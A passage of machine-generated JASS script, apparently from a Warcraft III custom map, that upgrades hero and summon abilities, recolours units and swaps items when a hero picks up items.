call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314153,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314230,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$4131415A,2)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
else
endif
if B2v() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A4A))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A49))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305333,2)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41304C56,2)
else
endif
if B2w() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A4D))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A49))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305335,2)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,2)
else
endif
if B2x() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A4C))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A49))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305336,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305337,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314159,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305338,2)
else
endif
if B2y() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A4B))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A49))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305334,2)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
else
endif
else
endif
if B26() then
if B20() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584D))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D45))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314154,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314232,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314231,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,3)
else
endif
if B21() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584B))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D45))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314153,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314230,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$4131415A,3)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
else
endif
if B22() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D44))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D45))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305333,3)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41304C56,3)
else
endif
if B23() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D43))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D45))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305335,3)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,3)
else
endif
if B24() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D41))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D45))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305336,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305337,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314159,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305338,3)
else
endif
if B25() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D42))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D45))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305334,3)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
else
endif
else
endif
if B3E() then
if B27() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584F))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584E))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314154,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314232,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314231,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,4)
else
endif
if B28() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305850))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584E))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314153,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314230,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$4131415A,4)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
else
endif
if B29() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305854))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584E))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305333,4)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313631)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41304C56,4)
else
endif
if B3B() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305853))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584E))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305335,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,4)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313631)
else
endif
if B3C() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D41))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584E))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305336,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305337,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314159,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305338,4)
else
endif
if B3D() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305852))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584E))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305334,4)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
else
endif
else
endif
if B3F() then
call SuspendHeroXPBJ(true,GetTriggerUnit())
set S2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=true
call SetHeroLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],51,false)
set S2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
call SuspendHeroXPBJ(false,GetTriggerUnit())
else
endif
if B3G() then
call SuspendHeroXPBJ(true,GetTriggerUnit())
set S2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=true
call SetHeroLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],52,false)
set S2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
call SuspendHeroXPBJ(false,GetTriggerUnit())
else
endif
endfunction
function B3I takes nothing returns nothing
set ir=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ir,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(ir,function B3H)
endfunction
function B3J takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B3K takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305333)==4) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3L takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305333)==3) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3M takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305335)==4) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3N takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305335)==3) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3O takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305334)==4) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3P takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305334)==3) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3Q takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305336)==4) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3R takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305336)==3) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3S takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305333)==2) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3T takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305335)==2) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3U takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305334)==2) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3V takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305336)==2) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3W takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305334)==1) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3X takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305335)==1) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3Y takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305336)==1) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3Z takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305333)==1) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3a takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314153)==1) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3b takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314153)==2) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3c takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314153)==3) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3d takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314153)==4) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3e takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314154)==1) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3f takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314154)==2) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3g takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314154)==3) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3h takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314154)==4) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B3i takes nothing returns nothing
if B3K() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.12
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+12
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E30354A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313631)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41304C56,4)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3L() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.09
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+9
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E30354A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41304C56,3)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3M() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.12
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+12
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E303549,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,4)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313631)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3N() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.09
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+9
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E303549,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,3)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3O() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.12
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+12
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6F303044,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call RemoveLocation(V0)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$53303059,4)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3P() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.09
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+9
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6F303044,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call RemoveLocation(V0)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$53303059,3)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3Q() then
